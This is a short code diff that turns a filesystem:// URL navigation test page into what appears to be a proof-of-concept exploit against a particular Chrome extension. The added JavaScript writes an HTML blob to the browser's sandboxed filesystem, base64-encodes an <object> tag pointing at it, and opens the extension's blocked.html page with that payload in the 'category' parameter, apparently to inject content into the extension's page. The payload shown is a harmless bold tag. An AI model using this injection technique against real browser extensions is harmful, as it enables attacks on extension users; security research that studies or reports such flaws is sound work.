@@ -1,9 +1,5 @@
 
 <!DOCTYPE html>
-<title>filesystem:// URL navigation</title>
-<style>iframe{display:block}</style>
-<iframe id="iframe"></iframe>
-<button>test</button>
 <script>
 function errorHandler(e) {
   console.log(`error!!!! ${e}`);
@@ -15,14 +11,11 @@ function init(fs) {
       fileWriter.onwriteend = function(e) {
         const url = fileEntry.toURL();
         const button = document.querySelector("button");
-        window.iframe.src = url;
-
-        button.addEventListener("click", function() {
-          window.open(url);
-        });
+        var payloadHTML = btoa('<object data="' + url + '"></object>');
+        window.open(`chrome-extension://iheobagjkfklnlikgihanlhcddjoihkg/blocked.html?category=${payloadHTML}`);
       };
       fileWriter.onerror = window.errorHandler;
-      var blob = new Blob([`Sup from: ${fileEntry.toURL()}`], {type: 'text/plain'});
+      var blob = new Blob([`<b>BOLD</b>`], {type: 'text/html'});
       fileWriter.write(blob);
     }, errorHandler);
   }, errorHandler);
